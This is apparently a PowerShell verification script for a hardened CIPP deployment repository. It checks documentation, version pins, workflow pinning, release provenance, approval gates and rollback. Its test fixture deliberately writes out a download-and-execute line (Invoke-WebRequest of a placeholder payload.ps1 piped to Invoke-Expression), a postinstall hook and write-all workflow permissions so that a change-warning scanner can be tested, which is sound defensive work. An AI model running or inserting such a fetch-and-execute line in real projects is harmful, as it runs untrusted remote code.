[CmdletBinding()]
param(
    [string]$RepositoryRoot = (Split-Path (Split-Path $PSScriptRoot -Parent) -Parent)
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

$RepositoryRoot = (Resolve-Path -LiteralPath $RepositoryRoot).Path
$gitCommand = if ($env:CIPP_HARDENED_GIT) {
    $env:CIPP_HARDENED_GIT
} else {
    (Get-Command git -ErrorAction Stop).Source
}
$results = [System.Collections.Generic.List[object]]::new()

function Assert-Control {
    param([bool]$Condition, [string]$Control, [string]$Evidence)
    if (-not $Condition) {
        throw "Control failed [$Control]: $Evidence"
    }
    $results.Add([pscustomobject][ordered]@{
        control = $Control
        passed = $true
        evidence = $Evidence
    })
}

$requiredDocuments = @(
    'docs/prd/CIPP-hardened-PRD.md',
    'docs/architecture/deployment.md',
    'docs/architecture/threat-model.md',
    'docs/hardening/index.md',
    'docs/risks/index.md',
    'docs/findings/open/README.md',
    'docs/findings/closed/README.md',
    'docs/releases/index.md',
    'docs/operations/initial-deployment.md',
    'docs/operations/update-process.md',
    'docs/operations/update-lifecycle.md',
    'docs/operations/rollback.md',
    'docs/operations/windows-codex-sandbox.md',
    'docs/templates/hardening-change.md',
    'docs/templates/finding.md',
    'docs/templates/risk-acceptance.md',
    'docs/templates/codex-review.md',
    'docs/templates/release-decision.md'
)
$missingDocuments = @($requiredDocuments | Where-Object {
    -not (Test-Path -LiteralPath (Join-Path $RepositoryRoot $_) -PathType Leaf)
})
Assert-Control ($missingDocuments.Count -eq 0) 'documentation-tree' "Required documents present: $($requiredDocuments.Count)"

$package = Get-Content -Raw -LiteralPath (Join-Path $RepositoryRoot 'package.json') | ConvertFrom-Json
$toolchain = Get-Content -Raw -LiteralPath (Join-Path $RepositoryRoot 'hardening/toolchain.json') | ConvertFrom-Json
Assert-Control ($package.packageManager -eq "yarn@$($toolchain.yarn.version)") 'package-manager-pin' "Frontend declares $($package.packageManager)."
Assert-Control ($package.engines.node -eq "^$($toolchain.node.version)") 'node-version-pin' "Frontend and toolchain agree on Node $($toolchain.node.version)."
Assert-Control ($toolchain.node.sha256 -match '^[a-f0-9]{64}$' -and $toolchain.yarn.integrity -match '^sha512-') 'toolchain-fingerprints' 'Node SHA-256 and Yarn SRI are recorded.'

$lifecycle = Get-Content -Raw -LiteralPath (Join-Path $RepositoryRoot 'docs/operations/update-lifecycle.md')
Assert-Control ($lifecycle -match '(?m)^\x60\x60\x60mermaid\s*$') 'lifecycle-mermaid' 'Standalone lifecycle document contains a Mermaid diagram.'

foreach ($template in @(
    'deployment/AzureDeploymentTemplate.json',
    'deployment/AzureDeploymentTemplate_regionoptions.json'
)) {
    $templatePath = Join-Path $RepositoryRoot $template
    $text = Get-Content -Raw -LiteralPath $templatePath
    $null = $text | ConvertFrom-Json
    Assert-Control ($text -notmatch '(?i)cippreleases\.blob\.core\.windows\.net/cipp-api/latest\.zip') 'immutable-api-deployment' "$template has no mutable upstream API latest.zip."
    Assert-Control ($text -notmatch '(?i)Microsoft\.Web/sites/extensions') 'no-bootstrap-zipdeploy' "$template has no API ZipDeploy bootstrap resource."
}

$workflowRoot = Join-Path $RepositoryRoot '.github/workflows'
$hardenedWorkflows = @(Get-ChildItem -LiteralPath $workflowRoot -Filter 'hardened_*.yml' -File)
Assert-Control ($hardenedWorkflows.Count -ge 3) 'workflow-foundation' "Found $($hardenedWorkflows.Count) hardened manual workflows."
foreach ($workflow in $hardenedWorkflows) {
    $text = Get-Content -Raw -LiteralPath $workflow.FullName
    Assert-Control ($text -match '(?m)^\s*workflow_dispatch\s*:') 'manual-workflow' "$($workflow.Name) supports manual dispatch."
    Assert-Control ($text -notmatch '(?m)^\s*schedule\s*:') 'no-scheduled-intake' "$($workflow.Name) has no schedule trigger."
    foreach ($match in [regex]::Matches($text, 'uses:\s*[^\s@]+@([^\s]+)')) {
        Assert-Control ($match.Groups[1].Value -match '^[a-f0-9]{40}$') 'pinned-action' "$($workflow.Name): $($match.Value)"
    }
}

$ignored = & $gitCommand -C $RepositoryRoot check-ignore '.local/api'
Assert-Control ($LASTEXITCODE -eq 0 -and $ignored) 'api-repository-separation' '.local/api is excluded from the coordinating repository.'

$baseline = Get-Content -Raw -LiteralPath (Join-Path $RepositoryRoot 'hardening/baseline.json') | ConvertFrom-Json
$frontendTagCommit = (& $gitCommand -C $RepositoryRoot rev-parse "$($baseline.frontend.tag)^{commit}").Trim()
Assert-Control ($LASTEXITCODE -eq 0 -and $frontendTagCommit -eq $baseline.frontend.upstreamCommit) 'frontend-provenance' "$($baseline.frontend.tag) resolves to recorded $frontendTagCommit."
$apiRepositoryRoot = Join-Path $RepositoryRoot '.local/api'
$apiTagCommit = (& $gitCommand -C $apiRepositoryRoot rev-parse "$($baseline.api.tag)^{commit}").Trim()
Assert-Control ($LASTEXITCODE -eq 0 -and $apiTagCommit -eq $baseline.api.upstreamCommit) 'api-provenance' "$($baseline.api.tag) resolves to recorded $apiTagCommit."
$frontendParent = (& $gitCommand -C $RepositoryRoot rev-parse "$($baseline.frontend.initialHardenedCommit)^").Trim()
Assert-Control ($frontendParent -eq $baseline.frontend.upstreamCommit) 'hardened-branch-base' 'Initial frontend hardening commit is directly based on the recorded upstream release.'

$manifestPath = Join-Path $RepositoryRoot 'docs/releases/ch-ui10.5.0-api10.5.3-r1/manifest.json'
$manifestResult = & (Join-Path $PSScriptRoot 'Test-ReleaseManifest.ps1') -ManifestPath $manifestPath -RepositoryRoot $RepositoryRoot
Assert-Control ($manifestResult.valid) 'initial-manifest' "Validated $($manifestResult.bundleId)."
$approvalWasBlocked = $false
$foundationArtifactRoot = Join-Path $RepositoryRoot '.artifacts'
$null = New-Item -ItemType Directory -Force -Path $foundationArtifactRoot
$unapprovedManifestPath = Join-Path $foundationArtifactRoot ('foundation-unapproved-manifest-' + [guid]::NewGuid().ToString('N') + '.json')
try {
    $unapprovedManifest = Get-Content -Raw -LiteralPath $manifestPath | ConvertFrom-Json
    $unapprovedManifest.status = 'ready-for-maintainer-approval'
    if ($unapprovedManifest.PSObject.Properties.Name -contains 'approval') {
        $unapprovedManifest.PSObject.Properties.Remove('approval')
    }
    $unapprovedManifest | ConvertTo-Json -Depth 20 | Set-Content -LiteralPath $unapprovedManifestPath -Encoding utf8NoBOM
    $pwshCommand = (Get-Command pwsh -ErrorAction SilentlyContinue).Source
    if (-not $pwshCommand) {
        $pwshCommand = (Get-Process -Id $PID).Path
    }
    $approvalArguments = @('-NoProfile', '-NonInteractive', '-File', (Join-Path $PSScriptRoot 'Test-ReleaseManifest.ps1'), '-ManifestPath', $unapprovedManifestPath, '-RepositoryRoot', $RepositoryRoot, '-RequireApproval')
    $PSNativeCommandUseErrorActionPreference = $false
    $null = & $pwshCommand @approvalArguments 2>$null
    $approvalWasBlocked = ($LASTEXITCODE -ne 0)
} finally {
    try {
        foreach ($temporaryPath in @($unapprovedManifestPath)) {
            if ($temporaryPath -and (Test-Path -LiteralPath $temporaryPath)) {
                Remove-Item -LiteralPath $temporaryPath -Force -ErrorAction Stop
            }
        }
    } catch {
        Write-Warning "Could not remove temporary unapproved manifest fixture: $($_.Exception.Message)"
    }
}
Assert-Control $approvalWasBlocked 'incomplete-release-blocked' 'Unapproved manifest is rejected by the deployment gate.'

$tempRoot = Join-Path $RepositoryRoot ('.artifacts/foundation-test-' + [guid]::NewGuid().ToString('N'))
$tempRoot = [IO.Path]::GetFullPath($tempRoot)
$allowedTempRoot = [IO.Path]::GetFullPath((Join-Path $RepositoryRoot '.artifacts')) + [IO.Path]::DirectorySeparatorChar
if (-not $tempRoot.StartsWith($allowedTempRoot, [StringComparison]::OrdinalIgnoreCase)) {
    throw "Refusing unsafe test path: $tempRoot"
}

try {
    $null = New-Item -ItemType Directory -Force -Path $tempRoot
    $null = & $gitCommand -C $tempRoot init '--quiet'
    $null = & $gitCommand -C $tempRoot config user.email 'foundation-test@invalid.local'
    $null = & $gitCommand -C $tempRoot config user.name 'CIPP-hardened foundation test'
    Set-Content -LiteralPath (Join-Path $tempRoot 'README.md') -Value 'baseline' -Encoding utf8NoBOM
    $null = & $gitCommand -C $tempRoot add README.md
    $null = & $gitCommand -C $tempRoot commit '--quiet' -m baseline
    $baseCommit = (& $gitCommand -C $tempRoot rev-parse HEAD).Trim()

    $null = New-Item -ItemType Directory -Force -Path (Join-Path $tempRoot '.github/workflows')
    $null = New-Item -ItemType Directory -Force -Path (Join-Path $tempRoot 'deployment')
    Set-Content -LiteralPath (Join-Path $tempRoot 'package.json') -Encoding utf8NoBOM -Value @'
{
  "dependencies": {
    "fixture": "https://example.invalid/fixture-1.0.0-beta.1.tgz"
  },
  "scripts": {
    "postinstall": "node install.js"
  }
}
'@
    Set-Content -LiteralPath (Join-Path $tempRoot '.github/workflows/change.yml') -Encoding utf8NoBOM -Value @'
name: fixture
permissions: write-all
jobs:
  fixture:
    uses: owner/repository/.github/workflows/reusable.yml@main
'@
    Set-Content -LiteralPath (Join-Path $tempRoot 'deployment/main.bicep') -Encoding utf8NoBOM -Value 'resource fixture ''Example.Type/name@2020-01-01'' = {}'
    Set-Content -LiteralPath (Join-Path $tempRoot 'download.ps1') -Encoding utf8NoBOM -Value 'Invoke-WebRequest https://example.invalid/payload.ps1 | Invoke-Expression'
    [IO.File]::WriteAllBytes((Join-Path $tempRoot 'payload.dll'), [byte[]](0, 1, 2, 3))
    $null = & $gitCommand -C $tempRoot add --all
    $null = & $gitCommand -C $tempRoot commit '--quiet' -m candidate
    $targetCommit = (& $gitCommand -C $tempRoot rev-parse HEAD).Trim()

    $warningResult = & (Join-Path $PSScriptRoot 'Get-ChangeWarnings.ps1') -RepositoryRoot $tempRoot -BaseCommit $baseCommit -TargetCommit $targetCommit -Component frontend
    $categories = @($warningResult.warnings.category | Sort-Object -Unique)
    $requiredCategories = @(
        'dependency-change',
        'workflow-change',
        'infrastructure-change',
        'binary-change',
        'non-registry-source',
        'prerelease-input',
        'install-script',
        'runtime-download',
        'dynamic-execution',
        'permission-change',
        'external-destination'
    )
    $missingCategories = @($requiredCategories | Where-Object { $_ -notin $categories })
    Assert-Control ($missingCategories.Count -eq 0) 'warning-simulation' "Detected categories: $($categories -join ', ')"

    $previousId = 'ch-ui1.0.0-api1.0.0-r1'
    $currentId = 'ch-ui1.0.1-api1.0.1-r1'
    foreach ($bundle in @($previousId, $currentId)) {
        $null = New-Item -ItemType Directory -Force -Path (Join-Path $tempRoot "docs/releases/$bundle")
    }
    $null = New-Item -ItemType Directory -Force -Path (Join-Path $tempRoot 'artifacts')
    Set-Content -LiteralPath (Join-Path $tempRoot 'artifacts/frontend.zip') -Value 'frontend' -Encoding utf8NoBOM
    Set-Content -LiteralPath (Join-Path $tempRoot 'artifacts/api.zip') -Value 'api' -Encoding utf8NoBOM
    $frontHash = (Get-FileHash -LiteralPath (Join-Path $tempRoot 'artifacts/frontend.zip') -Algorithm SHA256).Hash.ToLowerInvariant()
    $apiHash = (Get-FileHash -LiteralPath (Join-Path $tempRoot 'artifacts/api.zip') -Algorithm SHA256).Hash.ToLowerInvariant()
    $sha = '0123456789abcdef0123456789abcdef01234567'
    $lockHash = '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'

    $previousDirectory = Join-Path $tempRoot "docs/releases/$previousId"
    Set-Content -LiteralPath (Join-Path $previousDirectory 'codex-review.md') -Value "Status: Completed" -Encoding utf8NoBOM
    Set-Content -LiteralPath (Join-Path $previousDirectory 'findings.md') -Value "Status: Reviewed" -Encoding utf8NoBOM
    Set-Content -LiteralPath (Join-Path $previousDirectory 'decision.md') -Value "Status: Approved" -Encoding utf8NoBOM
    $previousManifest = [ordered]@{
        schemaVersion = 1
        bundleId = $previousId
        status = 'approved'
        frontend = [ordered]@{ upstreamCommit = $sha; hardenedCommit = $sha; lockfileSha256 = $lockHash }
        api = [ordered]@{ upstreamCommit = $sha; hardenedCommit = $sha; lockfileSha256 = $lockHash }
        documentation = [ordered]@{
            codexReview = "docs/releases/$previousId/codex-review.md"
            findings = "docs/releases/$previousId/findings.md"
            decision = "docs/releases/$previousId/decision.md"
            risks = @()
            releaseAgeEvidence = "docs/releases/$previousId/release-age-evidence.json"
            versionExceptions = @()
        }
        artifacts = @(
            [ordered]@{ component = 'frontend'; path = 'artifacts/frontend.zip'; sha256 = $frontHash },
            [ordered]@{ component = 'api'; path = 'artifacts/api.zip'; sha256 = $apiHash }
        )
        previousRelease = $null
        approval = [ordered]@{ maintainer = 'test'; approvedAt = '2026-01-01T00:00:00Z' }
        releaseAgePolicy = [ordered]@{
            minimumAgeDays = 30
            latestAllowedWhenAged = $true
            criticalFreshExceptionsOnly = $true
        }
    }
    [ordered]@{
        minimumAgeDays = 30
        status = 'passed'
        entries = @()
    } | ConvertTo-Json -Depth 8 | Set-Content -LiteralPath (Join-Path $previousDirectory 'release-age-evidence.json') -Encoding utf8NoBOM
    $previousManifest | ConvertTo-Json -Depth 8 | Set-Content -LiteralPath (Join-Path $previousDirectory 'manifest.json') -Encoding utf8NoBOM

    $previousManifest.documentation.risks = @('docs/risks/missing-risk-record.md')
    $missingRiskManifest = Join-Path $previousDirectory 'manifest-missing-risk.json'
    $previousManifest | ConvertTo-Json -Depth 8 | Set-Content -LiteralPath $missingRiskManifest -Encoding utf8NoBOM
    $missingRiskWasBlocked = $false
    try {
        $null = & (Join-Path $PSScriptRoot 'Test-ReleaseManifest.ps1') -ManifestPath $missingRiskManifest -RepositoryRoot $tempRoot
    } catch {
        $missingRiskWasBlocked = $true
    }
    Assert-Control $missingRiskWasBlocked 'missing-risk-blocked' 'A referenced but absent risk record is rejected.'
    $previousManifest.documentation.risks = @()
    $previousManifest | ConvertTo-Json -Depth 8 | Set-Content -LiteralPath (Join-Path $previousDirectory 'manifest.json') -Encoding utf8NoBOM

    $currentDirectory = Join-Path $tempRoot "docs/releases/$currentId"
    $currentManifest = [ordered]@{
        schemaVersion = 1
        bundleId = $currentId
        status = 'failed'
        previousRelease = $previousId
    }
    $currentManifest | ConvertTo-Json -Depth 4 | Set-Content -LiteralPath (Join-Path $currentDirectory 'manifest.json') -Encoding utf8NoBOM

    $rollback = & (Join-Path $PSScriptRoot 'Get-RollbackRelease.ps1') -CurrentManifestPath (Join-Path $currentDirectory 'manifest.json') -RepositoryRoot $tempRoot -HealthCheckFailed
    Assert-Control ($rollback.selectedRelease -eq $previousId) 'rollback-selection' "Failed $currentId selected $previousId and revalidated both hashes."
}
finally {
    try {
        if (Test-Path -LiteralPath $tempRoot) {
            Remove-Item -LiteralPath $tempRoot -Recurse -Force -ErrorAction Stop
        }
    } catch {
        Write-Warning "Could not remove temporary foundation test workspace: $($_.Exception.Message)"
    }
}

[pscustomobject][ordered]@{
    passed = $true
    controlCount = $results.Count
    controls = $results
}
